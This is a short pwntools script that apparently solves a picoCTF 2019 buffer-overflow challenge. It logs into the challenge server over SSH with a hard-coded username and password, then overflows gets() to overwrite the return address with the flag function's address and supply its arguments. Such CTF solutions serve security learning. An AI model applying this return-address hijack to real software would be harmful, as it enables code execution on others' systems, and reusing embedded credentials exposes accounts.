from pwn import *
s=ssh(host="2019shell1.picoctf.com",user="Hohenheim10",password="mhw1015sz15,.")
s.set_working_directory(wd=b"/problems/overflow-2_6_97cea5256ff7afcd9c8ede43d264f46e")
p = s.process("./vuln")

# 2 find the address of the flag function
e = ELF('./vuln_task6')
flag_address = p32(e.symbols['flag']) # integer to bytes

# 3 exploit the gets() function to overflow the buffer and override the return address of vuln() & the arguments for flag()
arg1 = p32(0xDEADBEEF)
arg2 = p32(0xC0DED00D)
string = b"A"*188+flag_address+b"AAAA"+ arg1 + arg2
p.sendlineafter("Please enter your string: \n", string)
line = p.recvline()
# print(line)
flag = p.recv().decode("utf-8")
# print(flag)
flag = flag.split("{")[1].split("}")[0]
print(flag)